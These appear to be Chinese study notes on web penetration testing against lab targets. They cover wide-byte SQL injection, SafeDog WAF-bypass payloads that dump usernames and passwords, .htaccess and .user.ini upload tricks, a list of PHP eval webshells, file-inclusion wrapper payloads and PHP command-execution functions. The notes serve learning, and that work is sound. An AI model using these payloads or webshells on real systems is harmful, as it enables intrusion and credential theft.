<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153300026.png" alt="image-20230607153300026" style="zoom: 33%;" />

## 宽字节注入

### 前置知识

#### 输入实体化

为了保证网站的安全性，通常会对用户的输入来做安全过滤，并将敏感字符进行实体化。

实体化：在`' " \ NULL`这些字符串前面加`\`

```php
<?php
$id = "1' and 1=1#";
$payload = addslashes($id);
$sql = "select * from users where id = '{$payload}'";
var_dump($sql);

# 输出
string(45) "select * from users where id = '1\' and 1=1#'"
```

数据库执行

```sql
# 可以发现：由于实体化，使用反斜杆进行转移，使得单引号变成了字符串，没有起效。导致SQL攻击失效
mysql> select * from users where id = '1\' and 1=2#';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set, 1 warning (0.00 sec)
```

### 注入原理

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

### 注入流程-Less-32

#### 寻找回显位

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,2,3%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201323254.png" alt="image-20230607201323254" style="zoom:33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(schema_name),3 from information_schema.schemata%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201634066.png" alt="image-20230607201634066" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201838412.png" alt="image-20230607201838412" style="zoom:33%;" />

#### 爆库

注意：`table_name='users'`这里的两个单引号无法逃逸，使用宽字节注入会造成语法错误，所以这里直接使用16进制

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203144060.png" alt="image-20230607203144060" style="zoom:33%;" />

#### 拖库

```
# 查询所有用户名
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(username),3 from users%23 
# 查询所有密码
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(password),3 from users%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203307391.png" alt="image-20230607203307391" style="zoom:33%;" />

## SQL注入-过狗

### 常见的WAF绕过语句

#### 注释

```
/*xxx*/：在SQL里，多行解释是 /* */
/*!xxx*/:MySQL扩展了解释的功能，如果后面加了!，那么注释符号将被执行
/*!50001xxxx*/：这里的50001表示如果数据库版本是：5.00.01以上版本，该语句才会被执行
# 最新版安全狗万能注释符绕过
/*//--**/
/*/!--**/
/*/-*!!*/
```

#### 替换

##### and、or替换

```
1、&&和||
2、使用异或或截断：?id=1^1^0		?id=1^0^0
3、使用{``operation}：and{`test` 1=2}		and{`test` 1=2}
4、直接使用真、假：&& true		&& false
```

##### order by替换

```
group by
```

##### union select

```
union all select
```

##### information_schema.tales

```
sys.schema_table_statistics_with_buffer
sys.schema_auto_increment_columns
mysql.innodb_table_stats
```

### 安全狗4.0.266-SQL注入过程

这里一开始使用教程给的注释符号无法绕过，开始做模糊测试

#### 模糊测试-注释符

==在做模糊测试之前需要先将安全狗的CC攻击检测关闭==

思路是往`/**/`里面填东西

![image-20230608172018747](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172018747.png)

![image-20230608172030624](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172030624.png)

可以发现有许多符号可以绕过安全狗

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172756462.png" alt="image-20230608172756462" style="zoom:50%;" />

给出几个可成功绕过的符号

```
/*//--**/ 
/*//---**/
/*//--/*/
/*//--/*/
```

#### order by查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=1' order /*//--/*/ by 3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173502813.png" alt="image-20230608173502813" style="zoom:50%;" />

#### UNION 查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,2,3%23v
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173625895.png" alt="image-20230608173625895" style="zoom:50%;" />

#### 查看当前数据库

这里可以看到被安全狗防御了，问题就出在`dataase()`身上

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173708699.png" alt="image-20230608173708699" style="zoom:33%;" />

将注释符往database()里面放进去，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(/*//--/*/),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173834474.png" alt="image-20230608173834474" style="zoom:50%;" />

#### 爆库

在做爆库的过程中，发现`from`后面不能再加东西

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174030426.png" alt="image-20230608174030426" style="zoom:50%;" />

尝试加上注释符，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174126231.png" alt="image-20230608174126231" style="zoom:50%;" />

再次发现安全狗对`information_schema`了防御

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174319537.png" alt="image-20230608174319537" style="zoom:50%;" />

尝试往`information_schema`中间加入注释符，成功绕过

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/information_/*//--/*/schema%23
```



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174403861.png" alt="image-20230608174403861" style="zoom:50%;" />

这里在网上看到这条payload，大概意思应该是这样

```sql
# 使用 /*!*/ 使得 # 的注释功能生效，注释掉后面的abc字符串，再使用换行来逃过 # 的注释，1 为要查询的信息，最后使用*/来闭合注释
mysql> select /*!#abc
    -> 1*/;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

/*!--+/*%0ainformation_schema.schemata*/ 完整解释
/*!--+  使得 --+ 注释功能生效
/*xxx*/ 混淆WAF
%0a		回车逃过 --+ 的注释
*/		最后使用 */ 来闭合前面的 /*
```



```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(schema_name)from/*!--+/*%0ainformation_schema.schemata*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180406635.png" alt="image-20230608180406635" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables where table_schema=database()*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180519244.png" alt="image-20230608180519244" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns where table_schema=database() and table_name='users'*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180612648.png" alt="image-20230608180612648" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(username,':',password)from/*!--+/*%0ausers*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180726467.png" alt="image-20230608180726467" style="zoom:50%;" />

### 安全狗4.0.266-无列名注入

安全狗对于输入有非常严格的过滤，一旦输入的字符串中包含了`information_schema`就会被拦截，所以这里学习一个`join 无列名报错注入`，==适用于无法使用`information_schema`但是知道数据表名的情况==

#### 注入原理

通过使用一张表做两次内联查询的方式来使得列名冲突的方式来使得数据库报错，并爆出冲突的列名

```sql
mysql> select * from (select * from users as a join users as b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users as b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users as a join users as b using(id, username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
mysql> select * from (select * from users as a join users as b using(id, username, password))c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

#### 注入流程

##### 爆字段

这里发现`union`和`from`后面都不能加东西，所以尝试加入注释符号绕过，成功得到第一个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b)c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195202683.png" alt="image-20230608195202683" style="zoom:50%;" />

使用 using 来排除字段，得到第二个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id))c --+
```

![image-20230608195241484](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195241484.png)

同样方法，得到第三个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195324303.png" alt="image-20230608195324303" style="zoom:50%;" />

回显正常，没有报错信息，列名爆破完成

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username, password))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195432015.png" alt="image-20230608195432015" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select 1,2,group_concat(username,':',password) from /*/!--**/ users --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195615749.png" alt="image-20230608195615749" style="zoom:50%;" />

# 文件上传

## `.htaccess`文件介绍

`htaccess`文件是Apache服务器中的一个配置文件，他复制相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

其中`.htaccess`文件内容

`SetHandler application/x-httpd-php`

==设置当前目录所有文件都使用`PHP`解析==，那么无论上传任何文件，只要文件内容符合`PHP`语言代码规范，就会被当作`PHP文件执行`。不符合则报错

### `.httpd.conf`

要使得`.htaccess`文件生效，则必须对`Apache`配置文件做以下配置

```bash
<Directory />
    AllowOverride all			# 启动 .htaccess 文件并允许用户对该文件进行修改（默认为none）
    Require all denied			# 禁止用户访问Apache运行目录
</Directory>
```

## `.user.ini`

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。

这个文件是php.ini的补充文件，==当访问PHP网页的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项==
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。

此文件与`.htaccess`文件类似，能指定具体的文件当作PHP文件来执行，但是一定要记住：==只作用于当前目录下==

```
auto_prepend_file 表示加载第一个PHP代码之前执行指示（包含的）PHP文件
auto_append_file 表示加载第一个PHP代码之后执行指示（包含的）PHP文件
简单来说
 
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
例如：auto_append_file、auto_prepend_file
指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。
```

## `.htaccess`和`.user.ini`文件总结

### 作用范围

`.htaccess`文件用于指定**当前目录**下的某个文件或全部文件当作PHP文件来执行，属于`Apache`的文件

`.user.ini`文件用于指定**当前目录**下的某个文件当作PHP文件来执行

### 激活

`.htaccess`文件在正确上传之后，Apache在加载某个文件之前会自动读取，只要保证`getshell`文件于`.htaccess`在同一目录就行

`.user.ini`文件在正确上传`getshell`文件之后必须先访问**同一目录**下的`PHP`文件，原因：`PHP`解释器在执行的时候会先检查当前目录是否存在`.user.ini`文件，存在则加载进配置文件`php.ini`，并执行配置文件的内容；后续使用蚁剑连接的URL则使用当前访问的PHP文件的URL来连接





## `$_Files` 变量

`$_Files`变量记录了文件的相信信息，包括文件类型，文件名，上传路径等

```bash
array(5) {
  ["name"]=>
  string(14) "金砖2023.txt"
  ["type"]=>
  string(10) "text/plain"
  ["tmp_name"]=>
  string(22) "C:\Windows\php80F6.tmp"
  ["error"]=>
  int(0)
  ["size"]=>
  int(247)
}
```

值得一提的是：`type`对应的是HTML中的`Content-Type`字段。大多数时候，后台程序员都是根据`type`的类型来判断文件类型是否合法。但是可以通过使用BP来修改`Content-Type`字段，以达到绕过的目的

现在将`.htaccess`文件上传，并将文件类型修改为图片文件。最后文件上传到服务器的文件名依然是：`.htaccrss`

==即：修改`Content-Type`不会影响文件的类型==

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230706134229696.png" alt="image-20230706134229696" style="zoom:50%;" />

## PHP一句话木马大全

```php
<?=eval($_POST['cmd']);?>
<?eval($_POST['cmd']);?>
<?php eval($_POST['cmd']);?>
<script language="php">eval($_POST['cmd']);</script>
```

# 文件包含

## 文件包含漏洞理论

### 文件包含漏洞产生原因

由于程序员的代码不规范或为了保证代码的灵活性，错误使用PHP文件包含函数，如：`include | require`函数，包含了一个**用户可控变量**，从而造成了文件包含漏洞

### 触发文件包含的PHP函数

```
Include：
Include_once：
require
require_once
highlight_file、show_source、readfile、file_get_contents、fopen、file
```

include 和 require 函数的区别：

`include` 和 `require` 都可以用来在 PHP 文件中插入另一个 PHP 文件的内容。它们的区别在于，当文件不存在时，`include` 会产生一个警告，但脚本会继续执行；而 `require` 会产生一个致命错误，并停止脚本执行

`include_once`和`require_once`若遇到重复包含的代码块，都只会包含一次

**补充：**`include`函数还可以包含图片文件或者其他文件，只要里面带有着`PHP`代码就会被执行

#### 文件包含漏洞分类

+ 本地文件包含

+ 远程文件包含

  ```
  allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件
  Allow_url_include：为ON时，就可使用include和require等方式包含远程文件
  ```

#### 文件包含漏洞利用方式

##### `PHP`伪协议

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)



```
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用
data:// 同样类似与php://input，可以让用户来控制输入流
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行
phar://xxx.png/shell.php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。
```

### 文件包含漏洞防御

+ PHP 中使用 open_basedir 配置限制访问在指定的区域
+ 过滤.（点）/（反斜杠）\（反斜杠）
+ 禁止服务器远程文件包含
+ 尽量不要使用动态包含，可以在需要包含的页面固定写好

## 文件包绕过方式

### `%00`截断

此方法要求`PHP`版本必须小于`5.3.4`，后面版本已修复

#### 源码

```php
<?php
include($_GET['library'].".php");
?>
```

#### 原理

在路径最后加入`%00`，传入`PHP`之后变成下面这样，相当于在最后添加了一个空格，让`PHP`读不到后面拼接出来的字符串

```php
<?php
include("flag.txt .php");
?>
```

补充，有时也可以使用`./`

### 路径长度绕过

## windows系统

### 1.路径长度绕过

==Windows使用256个`.`或`./`来绕过。Linux需要4096个==

**wj.php**

```javascript
<?php
$a=@$_GET['123'];
include($a.'.html');
?>
```

复制

如果限制了文件类型，比如这里只能包含html后缀的文件，那么就可以使用此方法

#### 简介

操作系统存在最大路径长度的限制。`windows系统，文件名最长256个字符`，可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名被中途截断

在文件后面加`.` 如： `info.php...........................................................................................................................................................................................................................................................................................html`

`.`超过256个就行，后面多出来的`...........................................html`不会被识别到

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1200.png)



## `PHP`伪协议

跟着这张图照着打就好

![image-20230707161448462](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707161448462.png)

`file://`：后面跟绝对路径，用于直接**读取文件**

`php://filter`：以`base64`的方式**读取文件**

`php://input`：接受POST数据，可以使用POST方法来**写入恶意代码并执行**

`zip://`：需要先上传一个带有`PHP`代码的`PHP`压缩文件（压缩文件不检验后缀名，只要是一个压缩文件就可以），然后通过访问这个压缩包里面指定的`PHP`文件以达到**执行PHP代码**的目的

### `php://filter`

注意：`read`是可选参数，在特点情况下，不带`read`参数的payload可以绕过WAF

![image-20230902155148007](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230902155148007.png)

#### `php://filter`格式

```
php://filter/<filtername>/resource=<filename>
<filtername>：过滤器
<filename>：文件名
```

#### `php://filter`过滤器详解

* `convert.base64-encode 和 convert.base64-decode`

  使用这两个过滤器等同于分别用 `base64_encode()` 或 `base64_decode()` 函数处理所有的流数据。

  ```php
  # 将数据流以base64编码
  php://filter/convert.base64-encode/resource=flag.php
  # 将数据流以base64解码
  php://filter/convert.base64-decode/resource=flag.php
  ```

+ `convert.quoted-printable-encode 和 convert.quoted-printable-decode`

  使用此过滤器的 decode 版本等同于用 `quoted_printable_decode()`函数处理所有的流数据。

  ==`quoted_printable`是一种编码格式==

  ```
  php://filter/convert.quoted-printable-encode/resource=flag.php
  ```

+ `convert.iconv.*`

  在激活 `iconv` 的前提下可以使用 `convert.iconv.*` 压缩过滤器， 等同于用` iconv()`处理所有的流数据。 该过滤器不支持参数，但可使用输入/输出的编码名称，组成过滤器名称，比如 `convert.iconv.<input-encoding>.<output-encoding>` 或 `convert.iconv.<input-encoding>/<output-encoding>` （两种写法的语义都相同）

  `icon()`函数解析：将字符串从一个字符编码转换到另一个字符编码

  **常见的编码转换格式**

  ```
  UTF-8 和 UTF-16
  UTF-8 和 ISO-8859-1
  UTF-8 和 Windows-1252
  UTF-8 和 GBK
  UTF-8 和 Big5
  ```

  **支持的编码格式**

  ![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/5a822481c9734b658c703ce0a782d502.png)![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/ee8f18d48b08440398466df437e38eae.png)

  ![img](https://img-blog.csdnimg.cn/ee8f18d48b08440398466df437e38eae.png)

```php
# 将flag.php文件从utf-8格式转换为utf-16编码
php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
# 将flag。php文件从utf-8格式转换为ASCII编码
 
```





直接使用`php://filter`来读取flag

```
payload：?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20230707221254364](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221254364.png)

![image-20230707221324095](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221324095.png)

### `php://input`

使用`php://input`配合POST方法做数据提交

![image-20230707221623621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707221623621.png)

### `zip://`

说明：

1. `zip`访问的压缩文件不校验后缀名，只要是压缩文件就行
2. `zip`必须使用**绝对路径**来访问压缩文件
3. `zip`在路径后面使用`%23具体文件名`来访问指定文件



先上传一个压缩文件

![image-20230707224105309](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224105309.png)

使用`zip`伪协议进行访问

![image-20230707224406577](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707224406577.png)

```
payload：?file=zip://E:\phpstudy\phpstudy\phpstudy_pro\WWW\lfi-labs-master\php\uploads\9dce5388f44ed37f145b3737f360f7c0.zip%23phpinfo.php
```

### `data://`

这个协议与`file`协议差不多，只不过比`file`更多的花样而已，具体可以看图

```
payload：?file=data://text/plain,<?php+phpinfo();?> 
```

![image-20230707225819389](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230707225819389.png)



# PHP命令执行

## 0x01. 实验环境搭建

#### docker搭建

```bash
# 搜索镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker search mcc0624  
NAME                 DESCRIPTION      STARS     OFFICIAL   AUTOMATED
mcc0624/ser          用户php反序列化漏洞学习    2                    
mcc0624/cmd                           0                    
mcc0624/flask_ssti                    0                    
mcc0624/ssrf         目前还未完成，请各位不要下载   0                    
mcc0624/ssrf_mysql                    0                    
mcc0624/php_apache                    0  

# 下载镜像
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker pull mcc0624/cmd

# 启动环境
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085:85 -i -t mcc0624/cmd:latest bash -c '/etc/rc.local; /bin/bash'
```

## 0x02. 命令执行函数介绍

### `system()`函数

执行指定命令并返回结果，默认有回显

#### 格式：

```
system(string $command, [int $return_var = ?])
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$cmd = 'dir';
$res = system($cmd);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of  :\PHP\PHP命令执行

2023/06/09  17:17    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:17    <DIR>          .idea
2023/06/09  17:17                58 system函数.php
               1 File(s)             58 bytes
               3 Dir(s)  177,981,693,952 bytes free

Process finished with exit code 0
```

### `exec()`函数

执行指定命令，将输出保存到一个指定的数组。**默认只输出最后一行结果，默认有回显**

#### 格式：

```php
exec(command, [str $output], [rint $eturn_var]);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `output`：用于存储命令的输出的数组。命令的每一行输出将作为数组的一个元素。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
# 默认只输出最后一个结果
<?php
$comm = 'dir';

$res = exec($comm);
echo $res;

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
               3 Dir(s)  177,981,693,952 bytes free
Process finished with exit code 0
```

```php
# 将返回的所有结果都存储到 $output arr()
<?php
$comm = 'dir';

$res = exec($comm, $output);
print_r($output);

# 输出
E:\phpstudy\phpstudy\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe D:\PHP\PHP命令执行\system函数.php
Array
(
    [0] =>  Volume in drive D is 新加卷
    [1] =>  Volume Serial Number is 40FB-5D65
    [2] => 
    [3] =>  Directory of D:\PHP\PHP命令执行
    [4] => 
    [5] => 2023/06/09  17:26    <DIR>          .
    [6] => 2023/06/09  17:15    <DIR>          ..
    [7] => 2023/06/09  17:25    <DIR>          .idea
    [8] => 2023/06/09  17:26                72 system函数.php
    [9] =>                1 File(s)             72 bytes
    [10] =>                3 Dir(s)  177,981,693,952 bytes free
)
```

### `passthru()`函数

功能与`system()`类似，默认有回显

#### 格式：

```
passthru(command, return_var);
```

- `command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。
- `return_var`：可选参数，用于存储命令的返回状态。如果提供了该参数，命令的返回状态将被存储在该变量中。

#### 演示：

```php
<?php
$comm = 'dir';
passthru($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:32    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:32                39 system函数.php
               1 File(s)             39 bytes
               3 Dir(s)  177,981,693,952 bytes free
```

### `shell_exec()`函数

功能与`system()`类似，默认**无回显**

#### 格式：

```
shell_exec(command);
```

`command`：要执行的操作系统命令，可以是一个简单的命令或命令组合。

#### 演示：

```php
<?php
$comm = 'dir';
echo shell_exec($comm);

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:41    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:28    <DIR>          .idea
2023/06/09  17:41                46 system函数.php
               1 File(s)             46 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### PHP反引号

反引号内的代码会直接被PHP当作系统命令来执行，**默认无回显**，但是，**如果是使用短标签包裹，那么就会有回显**

#### 格式：

```
$output = `command`;
```

#### 演示：

```php
<?php
echo `dir`;

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:43    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:42    <DIR>          .idea
2023/06/09  17:43                34 system函数.php
               1 File(s)             34 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `popopen()`函数

在 PHP 中，`popen()` 函数用于执行一个外部命令，并返回一个指向该命令输出流的文件指针。通过该文件指针，您可以读取外部命令的输出。默认无回显

#### 格式：

```php
$handle = popen('command', 'mode');
```

#### 演示：

```php
<?php
$comm = 'dir';
$res = popen($comm, 'r');
echo fread($res, 4096);

--------------------
while ($s = fgets($output)){
    echo $s;
}

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行

2023/06/09  17:50    <DIR>          .
2023/06/09  17:15    <DIR>          ..
2023/06/09  17:50    <DIR>          .idea
2023/06/09  17:50                73 system函数.php
               1 File(s)             73 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

### `proc_open()`函数

在 PHP 中，`proc_open()` 函数用于执行一个外部命令，并提供更高级的控制和灵活性，与 `popen()` 函数相比，`proc_open()` 函数提供了更多选项来管理进程的输入、输出和错误流。默认**无回显**

#### 格式：

```
resource proc_open(string $command, array $descriptorspec, array &$pipes, string|null $cwd = null, array|null $env = null, array|null $other_options = null)
```

- `command`：要执行的外部命令。

- ```
  descriptorspec
  ```

  ：一个包含输入、输出和错误流的规范数组。规范数组的格式如下：

  - `0`：标准输入流（输入到命令的数据）。
  - `1`：标准输出流（命令的输出结果）。
  - `2`：标准错误流（命令的错误输出）。
  - 其他索引：可以自定义的文件描述符。
  - 每个索引的值可以是：
    - `["pipe", "r"]`：创建一个可写入的管道。
    - `["pipe", "w"]`：创建一个可读取的管道。
    - `["file", "path/to/file", "mode"]`：以指定的文件路径和模式打开一个文件。

- `pipes`：一个保存命令输入、输出和错误流的文件指针的数组。

- `cwd`：设置命令的当前工作目录（可选）。

- `env`：设置命令执行时的环境变量（可选）。

- `other_options`：其他选项（可选）。

#### 演示：

```php
<?php
$comm = 'dir'; // 要执行的命令，这里是使用dir命令列出当前目录的内容
$arr = array(
    array("pipe", "r"), // 标准输入流，这里使用管道打开可写入的输入流
    array("pipe", "w"), // 标准输出流，这里使用管道打开可读取的输出流
    array("file", "error-output.txt", "a") // 标准错误流，这里将错误输出重定向到文件中
);

$fp = proc_open($comm, $arr, $pipes); // 执行命令并打开进程
echo stream_get_contents($pipes[1]); // 读取标准输出流的内容并输出到屏幕上
proc_close($fp); // 关闭进程

# 输出
 Volume in drive D is 新加卷
 Volume Serial Number is 40FB-5D65

 Directory of D:\PHP\PHP命令执行
 
2023/06/09  17:59    <DIR>          .
2023/06/09  17:15    <DIR>           ..
2023/06/09  17:50    <DIR>          .idea 
2023/06/09  17:59                 0 error-output.txt
2023/06/09  17:59               231 system函数.php
               2 File(s)            231 bytes
               3 Dir(s)  177,981,689,856 bytes free
```

## 0x03. `LD_PRELOAD`绕过原理介绍

### 攻击原理

在某些程序的运行过程中，会调用`LD_PRELOAD`，此时我们可以通过注入一个恶意的`LD_PRELOAD`库文件，使得程序在执行的过程中顺带执行了恶意程序，达到攻击的目的

举个例子：比如在`PHP`中的`echo`是一个打印函数，如果我们重构这个`echo()`函数，在里面调用`system()、shell()`等危险函数，那么用户在调用`echo()`函数时就会顺带执行了恶意代码

### 程序的链接

+ 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开

